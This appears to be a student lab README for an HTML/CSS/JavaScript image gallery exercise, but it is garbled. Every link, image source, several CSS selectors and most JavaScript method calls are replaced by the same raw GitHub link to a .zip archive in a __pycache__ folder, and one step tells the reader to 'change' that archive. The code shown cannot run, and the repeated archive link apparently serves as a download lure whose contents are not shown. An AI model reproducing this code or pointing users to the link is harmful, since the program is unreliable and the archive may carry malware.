# Ex.08 Design of Interactive Image Gallery
## Date: 08.10.2025

## AIM:
To design a web application for an inteactive image gallery with minimum five images.

## DESIGN STEPS:

### Step 1:
Clone the github repository and create Django admin interface.

### Step 2:
Change https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip file to allow request from all hosts.

### Step 3:
Use CSS for positioning and styling.

### Step 4:
Write JavaScript program for implementing interactivity.

### Step 5:
Validate the HTML and CSS code.

### Step 6:
Publish the website in the given URL.

## PROGRAM :
~~~
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>JavaScript Image Gallery</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #1e1f29, #3b3d52);
      background-attachment: fixed;
      background-size: cover;
      color: white;
      margin: 0;
      padding: 20px;
      text-align: center;
    }

    .gallery {
      display: flex;
      flex-wrap: wrap;
      gap: 20px;
      justify-content: center;
    }

    .gallery img {
      width: 200px;
      height: 400px;
      object-fit: cover;
      cursor: pointer;
      border-radius: 10px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
      transition: transform 0.3s, box-shadow 0.3s;
    }

    .gallery img:hover {
      transform: scale(1.07);
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.6);
    }

    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0; top: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.85);
      justify-content: center;
      align-items: center;
    }

    .modal img {
      max-width: 90%;
      max-height: 90%;
      border-radius: 10px;
      box-shadow: 0 0 25px rgba(255, 255, 255, 0.2);
    }

    https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip {
      display: flex;
    }

    .modal-close {
      position: absolute;
      top: 20px;
      right: 30px;
      font-size: 35px;
      color: white;
      cursor: pointer;
      font-weight: bold;
    }

    h1 {
      text-shadow: 0 2px 10px rgba(255, 255, 255, 0.3);
    }
  </style>
</head>
<body>

  <h1>JavaScript Image Gallery</h1>

  <div class="gallery">
    <img src="https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip" alt="Image 1">
    <img src="https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip" alt="Image 2">
    <img src="https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip" alt="Image 3">
    <img src="https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip" alt="Image 4">
  </div>

  <div class="modal" id="imageModal">
    <span class="modal-close" id="closeModal">&times;</span>
    <img id="modalImg" src="" alt="Large View">
  </div>

  <script>
    const galleryImages = https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('.gallery img');
    const modal = https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('imageModal');
    const modalImg = https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('modalImg');
    const closeModal = https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('closeModal');

    https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip(img => {
      https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('click', () => {
        https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip = https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip;
        https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('active');
      });
    });

    https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('click', () => {
      https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('active');
    });

    https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('click', (e) => {
      if (https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip === modal) {
        https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip('active');
      }
    });
  </script>

</body>
</html>

~~~
## OUTPUT:

![alt text](https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip)
![alt text](https://raw.githubusercontent.com/AdityaJorim007/igallery/main/aditya/aditya/__pycache__/igallery_2.6.zip)

## RESULT:
The program for designing an interactive image gallery using HTML, CSS and JavaScript is executed successfully.
